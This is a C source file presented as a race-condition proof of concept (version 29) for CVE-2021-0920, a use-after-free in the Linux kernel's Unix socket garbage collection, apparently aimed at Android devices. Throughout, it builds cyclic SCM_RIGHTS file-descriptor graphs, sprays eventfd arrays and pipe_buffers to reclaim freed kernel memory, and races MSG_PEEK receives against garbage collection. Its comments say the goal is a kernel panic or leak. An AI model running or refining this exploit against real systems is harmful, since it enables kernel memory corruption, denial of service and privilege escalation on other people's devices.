#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <sched.h>
#include <errno.h>
#include <stdbool.h>
#include <stdarg.h>
#include <time.h>
#include <fcntl.h>

volatile bool stop_race = false;
FILE* logfile = NULL;
int tfd;
int spray_sv[32][2];
int spray_efds[4];

// Пул циклических сокетов (для триггера GC)
#define POOL_SIZE 20000
// Количество pipe_buffer для спрея
#define PIPE_SPRAY_COUNT 2048

void log_msg(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf("\n");
    if (logfile) {
        va_start(args, fmt);
        vfprintf(logfile, fmt, args);
        va_end(args);
        fprintf(logfile, "\n");
        fflush(logfile);
    }
}

void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    sendmsg(socket, &msg, MSG_DONTWAIT);
}

int recv_fd(int socket, int flags) {
    struct msghdr msg = {0};
    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    if (recvmsg(socket, &msg, flags | MSG_DONTWAIT) < 0) return -1;
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
        int fd;
        memcpy(&fd, CMSG_DATA(cmsg), sizeof(int));
        return fd;
    }
    return -1;
}

void* pool_builder_thread(void* arg) {
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(2, &set); sched_setaffinity(0, sizeof(set), &set);
    long created = 0;
    while (!stop_race) {
        int a[2], b[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, a) == 0 &&
            socketpair(AF_UNIX, SOCK_STREAM, 0, b) == 0) {
            send_fd(a[0], b[0]);
            send_fd(b[0], a[0]);
            close(a[0]); close(a[1]);
            close(b[0]); close(b[1]);
            created += 2;
        }
        if (created % 100 == 0) usleep(100);
        if (created % 10000 == 0) log_msg("[Pool] Created ~%ld inflight refs", created);
    }
    return NULL;
}

void* spray_thread(void* arg) {
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(1, &set); sched_setaffinity(0, sizeof(set), &set);
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int) * 4)];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int) * 4);
    memcpy(CMSG_DATA(cmsg), spray_efds, sizeof(int) * 4);

    while (!stop_race) {
        for (int i = 0; i < 32; i++) {
            sendmsg(spray_sv[i][0], &msg, MSG_DONTWAIT);
        }
        for (int i = 0; i < 32; i++) {
            char dummy[1];
            recv(spray_sv[i][1], dummy, 1, MSG_DONTWAIT);
        }
        usleep(10); 
    }
    return NULL;
}

void* pipe_spray_thread(void* arg) {
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(3, &set); sched_setaffinity(0, sizeof(set), &set);
    
    int pipes[PIPE_SPRAY_COUNT][2];
    for (int i = 0; i < PIPE_SPRAY_COUNT; i++) {
        if (pipe(pipes[i]) < 0) {
            log_msg("[-] pipe() failed at %d", i);
            break;
        }
        // Заполняем pipe на 1 байт, чтобы выделить страницу (pipe_buffer)
        write(pipes[i][1], "A", 1);
    }
    log_msg("[Pipe Spray] Allocated %d pipe_buffers", PIPE_SPRAY_COUNT);
    
    while (!stop_race) {
        // Держим pipe_buffer живыми
        usleep(100000);
    }
    return NULL;
}

void* race_thread(void* arg) {
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(0, &set); sched_setaffinity(0, sizeof(set), &set);

    long iter = 0;
    long success_peek = 0;
    long no_peek = 0;

    while (!stop_race) {
        int R[2], B[2], C[2], D[2];
        
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, R) < 0 ||
            socketpair(AF_UNIX, SOCK_STREAM, 0, B) < 0 ||
            socketpair(AF_UNIX, SOCK_STREAM, 0, C) < 0 ||
            socketpair(AF_UNIX, SOCK_STREAM, 0, D) < 0) {
            usleep(1000);
            continue;
        }

        // 1. Строим граф R -> B -> C -> D -> C
        send_fd(R[0], B[1]);
        send_fd(B[0], C[1]);
        send_fd(C[0], D[1]);
        send_fd(D[0], C[1]);

        // 2. Закрываем все внешние ссылки, кроме R[1]
        close(R[0]); 
        close(B[0]); close(B[1]); 
        close(C[0]); close(C[1]); 
        close(D[0]); close(D[1]); 

        // 3. PEEK из R
        int b_fd = recv_fd(R[1], MSG_PEEK);
        if (b_fd >= 0) {
            int c_fd = recv_fd(b_fd, MSG_PEEK);
            if (c_fd >= 0) {
                struct timespec now;
                clock_gettime(CLOCK_MONOTONIC, &now);
                struct itimerspec its;
                its.it_value.tv_sec = now.tv_sec;
                its.it_value.tv_nsec = now.tv_nsec + 2000; // 2 мкс
                if (its.it_value.tv_nsec >= 1000000000) {
                    its.it_value.tv_sec++;
                    its.it_value.tv_nsec -= 1000000000;
                }
                its.it_interval.tv_sec = 0;
                its.it_interval.tv_nsec = 0;
                timerfd_settime(tfd, TFD_TIMER_ABSTIME, &its, NULL);

                recv_fd(b_fd, 0); // Очищаем UNIXCB у B
                
                // ВОТ ЗДЕСЬ МЫ ПЫТАЕМСЯ ПРОЧИТАТЬ C
                // Если GC освободил sk_buff, а pipe_spray_thread занял его pipe_buffer,
                // ядро прочитает pipe_buffer как scm_fp_list. Это вызовет панику или утечку.
                int res = recv_fd(c_fd, 0);
                if (res >= 0) {
                    success_peek++;
                    close(res);
                }
                close(c_fd);
            }
            close(b_fd);
        } else {
            no_peek++;
        }
        
        close(R[1]); 

        iter++;
        if (iter % 1000 == 0) {
            log_msg("[*] Iter: %ld, Success: %ld, NoPeek: %ld", iter, success_peek, no_peek);
        }
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    logfile = fopen("/data/local/tmp/race_v29.log", "w");
    log_msg("[*] CVE-2021-0920 Race PoC v29 (Pipe Buffer Spray)");

    tfd = timerfd_create(CLOCK_MONOTONIC, 0);

    for (int i = 0; i < 32; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray_sv[i]) < 0) return 1;
    }
    for (int i = 0; i < 4; i++) {
        spray_efds[i] = eventfd(0, 0);
    }

    pthread_t t_spray, t_pool, t_pipe_spray, t_race;
    pthread_create(&t_spray, NULL, spray_thread, NULL);
    pthread_create(&t_pool, NULL, pool_builder_thread, NULL);
    pthread_create(&t_pipe_spray, NULL, pipe_spray_thread, NULL);
    pthread_create(&t_race, NULL, race_thread, NULL);

    sleep(300);
    stop_race = true;

    pthread_join(t_spray, NULL);
    pthread_join(t_pool, NULL);
    pthread_join(t_pipe_spray, NULL);
    pthread_join(t_race, NULL);

    log_msg("[-] PoC finished.");
    if (logfile) fclose(logfile);
    return 0;
}